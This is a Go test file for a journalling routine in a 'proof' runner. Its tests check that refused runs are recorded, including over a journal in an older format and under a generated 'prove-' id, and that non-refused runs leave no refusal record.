// TestARefusalOverAJournalOfAnOlderFormEndsOnTheJournalNotTaking: prove's
// refusal is journalled by an append that reads nothing first, and over a
// journal of an older form that append is refused. The run
// still ends refused, with no cell, the scratch folder released, and the
// error ends on the refusal not being journalled with the journal's own
// error under it, by type and by its words. Risk: a refused run that a
// journal it cannot write lets through, or ends on an error that hides why.
func TestARefusalOverAJournalOfAnOlderFormEndsOnTheJournalNotTaking(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	r.refuse(1, memoryWhy)
	req := r.request(model.Isolated, theCase(3, "src/a.go"))
	req.Run, req.Engine = "prove-7", "0.9.0"
	p := r.w.Ports()
	p.Journal = olderJournal{p.Journal}
	got, err := proof.Run(t.Context(), p, req)
	if !errors.Is(err, port.ErrRefused) || got != nil || !strings.Contains(err.Error(), memoryWhy) {
		t.Fatalf("Run = %+v, %v, want no cell and the refusal, whole", got, err)
	}
	if _, ok := errors.AsType[*model.OlderJournalError](err); !ok {
		t.Errorf("Run = %v, want the journal's error under it", err)
	}
	if want := "the refusal could not be journalled: journal append: line 1 of the journal /state/aa.journal"; !strings.Contains(err.Error(), want) {
		t.Errorf("Run = %v, want it to end on %q and the fix", err, want)
	}
	r.free(t)
	r.released(t, 1)
}

// TestARefusedRunWithNoIdIsJournalledUnderOneOfItsOwn: a request that names no
// run still leaves the record, under an id the journal accepts.
func TestARefusedRunWithNoIdIsJournalledUnderOneOfItsOwn(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	r.refuse(1, memoryWhy)
	if _, err := r.run(model.Isolated, theCase(3, "src/a.go")); !errors.Is(err, port.ErrRefused) {
		t.Fatalf("Run = %v, want the refusal", err)
	}
	recs := r.recordsOf(t)
	if len(recs) != 1 || !strings.HasPrefix(recs[0].Run, "prove-") {
		t.Errorf("records %+v, want one under a prove- id", recs)
	}
}

// TestARunNothingRefusedLeavesNoRefusalRecord: a run that passes, one that
// hits a limit and one whose tool is not here write no refusal.
func TestARunNothingRefusedLeavesNoRefusalRecord(t *testing.T) {
	t.Parallel()
	for _, hit := range []bool{false, true} {
		r := newRig(t)
		r.say(1, "")
		r.say(2, "no-x src/a.go\n")
		req := r.request(model.Isolated, theCase(3, "src/a.go"))
		req.Findings = limited(req.Findings, hit)
		if _, err := proof.Run(t.Context(), r.w.Ports(), req); err != nil {
			t.Fatalf("hit %v: Run = %v", hit, err)
		}
		if recs := r.recordsOf(t); len(recs) != 0 {
			t.Errorf("hit %v: the journal holds %+v, want none", hit, recs)
		}
	}
	r := newRig(t)
	req := r.request(model.Isolated, theCase(3, "src/a.go"))
	req.Jobs[0].Version = "9.9.9"
	if got, err := proof.Run(t.Context(), r.w.Ports(), req); err != nil || got[0].Reason != model.ReasonToolMissing {
		t.Fatalf("tool missing: Run = %+v, %v", got, err)
	}
	if recs := r.recordsOf(t); len(recs) != 0 {
		t.Errorf("tool missing: the journal holds %+v, want none", recs)
	}
}
